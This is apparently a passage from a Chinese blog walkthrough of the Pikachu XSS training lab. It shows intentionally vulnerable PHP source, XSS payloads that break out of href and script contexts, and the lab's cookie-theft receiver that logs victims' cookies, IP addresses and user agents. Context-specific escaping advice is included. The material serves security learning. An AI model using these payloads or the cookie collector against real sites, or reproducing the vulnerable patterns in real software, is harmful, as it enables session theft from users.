</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;输入点啥吧！&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#39;处理
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$message</span><span class="o">=</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html1</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;你的输入已经被记录:&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//输入的内容被处理后输出到了input标签的value属性里面
</span></span></span><span class="line"><span class="cl"><span class="c1">//      $html2.=&#34;&lt;input class=&#39;input&#39; type=&#39;text&#39; name=&#39;inputvalue&#39; readonly=&#39;readonly&#39; value=&#39;{$message}&#39; style=&#39;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&#39;/&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$html2</span><span class="o">.=</span><span class="s2">&#34;&lt;a href=&#39;</span><span class="si">{</span><span class="nv">$message</span><span class="si">}</span><span class="s2">&#39;&gt;</span><span class="si">{</span><span class="nv">$message</span><span class="si">}</span><span class="s2">&lt;/a&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="xss常见防范措施">XSS常见防范措施</h3>
<p><strong>总原则：输入做过滤，输出做转义</strong></p>
<ul>
<li>过滤：根据需求做过滤。比如要求输入手机号码就只允许输入手机号码格式的数字</li>
<li>转义：对所有输出到前端的数据都根据输出点进行转义。
<ul>
<li>输出到HTML中就进行HTML实体转义</li>
<li>输出到JavaScript里就进行JavaScript转义</li>
</ul>
</li>
</ul>
<h4 id="herf输出">herf输出</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;xss_03.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;www.baidu.com&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//输出在a标签的href属性里面,可以使用javascript协议来执行js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//防御:只允许http,https协议,其次在进行htmlspecialchars处理
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$message</span><span class="o">=</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">],</span><span class="nx">ENT_QUOTES</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;a href=&#39;</span><span class="si">{</span><span class="nv">$message</span><span class="si">}</span><span class="s2">&#39;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;打个胶先&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022081-succ.png"></p>
<h4 id="js输出">js输出</h4>
<p>后端源码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;xss_04.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$jsvar</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//这里讲输入动态的生成到了js中,形成xss
</span></span></span><span class="line"><span class="cl"><span class="c1">//javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">//讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修?
</span></span></span><span class="line"><span class="cl"><span class="c1">//这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。
</span></span></span><span class="line"><span class="cl"><span class="c1">//所以在JS的输出点应该使用\对特殊字符进行转义
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span> <span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$jsvar</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="c1">//  $jsvar=htmlspecialchars($_GET[&#39;message&#39;],ENT_QUOTES);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nv">$jsvar</span> <span class="o">==</span> <span class="s1">&#39;tmac&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;img src=&#39;</span><span class="si">{</span><span class="nv">$PIKA_ROOT_DIR</span><span class="si">}</span><span class="s2">assets/images/nbaplayer/tmac.jpeg&#39; /&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>前端源码片段：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$ms</span><span class="o">=</span><span class="s1">&#39;0721&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">$ms</span><span class="p">.</span><span class="nx">length</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">$ms</span> <span class="o">==</span> <span class="s1">&#39;tmac&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fromjs&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="s1">&#39;tmac确实厉害,看那小眼神..&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="c1">//            alert($ms);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fromjs&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="s1">&#39;无论如何不要放弃心中所爱..&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>看提示输入个tamc试试（私货）：</p>
<p><img alt="img" src="./img/20220911-2.png"></p>
<p>靶场作者还是个麦迪粉</p>
<p>payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">&#39;#&#39;<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;打个胶先&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>这样整行代码就变成了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">$ms=&#39;&#39;#&#39;<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;打个胶先&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>&#39;;
</span></span></code></pre></div><p><img alt="img" src="./img/2022081-succ.png"></p>
<h3 id="实例演示">实例演示</h3>
<p>pikachu还为我们提供了一个XSS后台，可以用于实例演示</p>
<p>核心代码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="s1">&#39;../inc/config.inc.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="s1">&#39;../inc/mysql.inc.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$link</span><span class="o">=</span><span class="nx">connect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//这个是获取cookie的api页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cookie&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$time</span><span class="o">=</span><span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d g:i:s&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ipaddress</span><span class="o">=</span><span class="nx">getenv</span> <span class="p">(</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$cookie</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$referer</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$useragent</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;insert cookies(time,ipaddress,cookie,referer,useragent) 
</span></span></span><span class="line"><span class="cl"><span class="s2">    values(&#39;</span><span class="si">$time</span><span class="s2">&#39;,&#39;</span><span class="si">$ipaddress</span><span class="s2">&#39;,&#39;</span><span class="si">$cookie</span><span class="s2">&#39;,&#39;</span><span class="si">$referer</span><span class="s2">&#39;,&#39;</span><span class="si">$useragent</span><span class="s2">&#39;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location:http://192.168.1.4/pikachu/index.php&#34;</span><span class="p">);</span><span class="c1">//重定向到一个可信的网站
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">// error_reporting(0);
</span></span></span><span class="line"><span class="cl"><span class="err">include_once &#39;../inc/config.inc.php&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">include_once &#39;../inc/mysql.inc.php&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">$link=connect();
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">// 判断是否登录，没有登录不能访问
</span></span></span><span class="line"><span class="cl"><span class="err">if(!check_login($link)){
</span></span></span><span class="line"><span class="cl"><span class="err">    header(&#34;location:../pkxss_login.php&#34;);
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">if(isset($_GET[&#39;id&#39;]) &amp;&amp; is_numeric($_GET[&#39;id&#39;])){
</span></span></span><span class="line"><span class="cl"><span class="err">    $id=escape($link, $_GET[&#39;id&#39;]);
